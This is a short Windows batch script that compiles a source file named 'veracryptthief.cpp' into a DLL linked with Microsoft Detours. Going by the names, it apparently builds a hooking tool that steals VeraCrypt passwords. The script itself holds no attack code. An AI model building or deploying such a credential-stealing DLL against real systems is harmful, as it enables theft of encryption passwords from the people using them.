@ECHO OFF

cl.exe /nologo /W0 veracryptthief.cpp /MT /link /DLL detours\lib.X64\detours.lib /OUT:veracryptthief.dll
